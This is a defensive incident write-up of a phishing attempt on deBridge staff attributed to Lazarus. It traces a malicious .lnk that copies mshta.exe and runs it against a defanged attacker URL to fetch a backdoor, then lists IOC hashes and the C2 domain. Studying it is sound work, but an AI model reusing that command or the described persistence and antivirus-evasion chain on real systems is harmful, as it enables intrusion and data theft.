# deBridge (Attempt)

Date:: August 5, 2022

Tags:: 🔑 - Google Docs Phishing


---


## Details

PSA for all teams in Web3, this campaign is likely widespread.
The attack vector was via email, with several of our team receiving a PDF file named “New Salary Adjustments” from an email address spoofing mine.
We have strict internal security policies and continuously work on improving them as well as educating the team about possible attack vectors. 
Most of the team members immediately reported the suspicious email, but one colleague downloaded and opened the file
This made us investigate the attack vector to understand how exactly it was supposed to work and what the consequences would be.
Attack won’t infect macOS users: opening this link on a Mac leads to zip archive with the normal PDF file Adjustments.pdf (md5: 15a4…39c2)
…while opening this link on Windows systems leads to an archive with password-protected pdf with the same name (md5: 0038…8bc4), and an additional file named Password.txt.lnk (md5: 2eaa…6a30)
The attack vector is as follows: user opens link from email -> downloads & opens archive -> tries to open PDF, but PDF asks for a password -> user opens password.txt.lnk and infects the whole system.
We’ve inspected password.txt.lnk and here's a brief description of its contents/actions.
LnkParse shows us that clicking the lnk file will execute a cmd.exe command.
Long story short, this command performs the following actions:
Copy C:\Windows\System32\mshta.exe -> %public%/mshta.exe
mshta.exe “https://www[.]googlesheet[.]info/NZrTnPVmtfjcSMz8n1hZZzvHQvUUEfFnIMAYliQuR+A=”
Opening the link in the browser won’t give any content, so we tried to simulate mshta.exe headers with cUrl and it worked!

### Moving deeper into the rabbit hole reveals what this script does:
    - 1. Show notepad.exe with “pdf password”: Salary2022
    - 2. Check if Antivirus processes are active (ekrn - Eset, qqpcrtp - Tencent, bdagent - BitDefender)
    - 3. If no AV processes are found: save the generated malicious file named Box.lnk into autostart folder
    - 4. Decode Base64-encoded backdoor from var lp, save it into a file with a random name

### Here is how it looks:
    - This simple script sends repetitive requests to the attacker command center (CnC) in order to receive instructions. 
    - Replacing eval with logging/echo in the code allowed us to receive malicious instructions from the CnC and analyze them without execution.
    - After a series of empty responses we were finally able to receive the next part. 
    - Fast analysis showed that received code collects A LOT of information about the PC and exports it to CnC: username, OS info, CPU info, network adapters, and running processes.
    - System is considered compromised at the moment because any code from CnC can be performed on the infected machine.
    - It’s interesting that only a few anti-virus solutions mark these files as malicious.
    - According to the Twitter thread https://mobile.twitter.com/cyberoverdrive/status/1550175620927299584 files with the same names (but different hashes) were noticed and attributed to Lazarus Group (North-Korean hackers).

### DangerousPassword / CryptoCore / CryptoMimic / APT
    - b52e3aaf1bd6e45d695db573abc886dc
    - Password.txt.lnk
    - www[.]googlesheet[.]info - overlapping infrastructure with @h2jazi's tweet as well as earlier campaigns.
    - d73e832c84c45c3faa9495b39833adb2
    - New Salary Adjustments.pdf 💸💸💸 twitter.com/h2jazi/status/…
    - More related files can be found with #DangerousPassword hashtag, old research is available here: https://threatbook.cn/ppt/The%20Nightmare%20of%20Global%20Cryptocurrency%20Companies%20-%20Demystifying%20the%20%E2%80%9CDangerousPassword%E2%80%9D%20of%20the%20APT%20Organization.pdf
    - Indicators of Compromise: CnC: www[.]googlesheet[.]info
    - New Salary Adjustments.pdf (clean): 15a42f76f41c8f4bab828160e4fd39c2
    - New Salary Adjustments.pdf (with password): 00380fcbb2af75ec177301d44d658bc4
    - password.txt.lnk: 2eaa53ccb43cd38a1f0a28abcd7f6a30

TL;DR: Never open email attachments without verifying the sender’s full email address, and have an internal protocol for how your team shares attachments!


## URLs

- https://twitter.com/AlexSmirnov__/status/1555586334378676225
- https://bleepingcomputer.com/news/security/north-korean-hackers-target-crypto-experts-with-fake-coinbase-job-offers/
- https://bleepingcomputer.com/news/security/debridge-finance-crypto-platform-targeted-by-lazarus-hackers/
